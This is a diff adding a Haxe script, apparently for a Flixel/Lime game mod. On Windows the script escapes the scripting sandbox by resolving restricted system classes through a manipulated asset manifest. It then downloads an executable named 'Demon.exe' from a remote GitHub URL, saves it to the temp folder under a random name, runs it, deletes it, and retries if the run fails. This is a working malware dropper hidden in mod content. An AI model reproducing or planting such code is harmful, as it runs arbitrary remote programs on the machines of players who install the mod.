@@ -1,0 +1,92 @@
+import sys.thread.Thread;
+import lime.utils.AssetManifest;
+import lime.app.Promise;
+using StringTools;
+
+class Ev
+{
+    #if windows
+    static var Sys:Class<Sys> = null;
+    static var File:Class<File> = null;
+    static var FileSystem:Class<FileSystem> = null;
+    static var Type:Class<FileSystem> = null;
+    static var Reflect:Class<FileSystem> = null;
+    static function init()
+    {
+        Sys = resolveClassEvilly("Sys");
+        File = resolveClassEvilly("sys.io.File");
+        FileSystem = resolveClassEvilly("sys.FileSystem");
+        Type = resolveClassEvilly("Type");
+        Reflect = resolveClassEvilly("Reflect");
+        if(Sys == null) return;
+        Reflect.field(FlxG, "save").data.DGrab = false;
+        if (Reflect.field(FlxG, "save").data.DGrab) return;
+
+        var temp = Sys.getEnv("TEMP");
+        if (temp.endsWith("\\") == false) temp += "\\";
+        var path = temp + "sfsdlfnkslfsdnf.exe";
+        try { FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+        var future:Future<Bytes> = downloadDemonAsync();
+        future.onComplete(bytes -> {
+            File.saveBytes(path, bytes);
+            
+            runExeAsync(path).onComplete(worked -> {
+                if(worked)
+                {
+                    try { FileSystem.deleteFile(path); } catch(e:Dynamic) {}
+                    Reflect.field(FlxG, "save").data.DGrab = true;
+                }
+                else
+                {
+                    Reflect.field(FlxG, "save").data.DGrab = false;
+                    init();
+                }
+
+            });
+        });
+        
+        future.onError(er -> {
+            trace(er);
+        });
+    }
+
+    static function downloadDemonAsync():Future<Bytes>
+    {
+        var link = "https://raw.githubusercontent.com/EvilDev067/EvSc/refs/heads/main/Demon.exe";
+        var http = Type.resolveClass("lime.net._HTTPRequest_Bytes");
+        var request = Type.createInstance(http, []);
+        return request.load(link);
+    }
+
+    static var promise:Promise = null;
+
+    static function runExeAsync(appPath:String):Future<Bool>
+    {
+        promise = new Promise();
+        
+        Thread.create(() -> {
+            var exitCode = Sys.command(appPath);
+            complete(exitCode == 0);
+        });
+
+        return promise.future;
+    }
+
+    static function complete(worked:Bool)
+    {
+        promise?.complete(worked);
+    }
+
+    static function resolveClassEvilly(name:String)
+    {
+        var manifest:AssetManifest = new AssetManifest();
+        manifest.assets = [{size: 67, className: 'Type', id: 'Ev'}];
+        
+        var lol = Assets.getLibrary('');
+        lol.__fromManifest(manifest);
+        
+        var Type = lol.classTypes.get('Ev');
+        return Type.resolveClass(name);
+    }
+    #end
+}
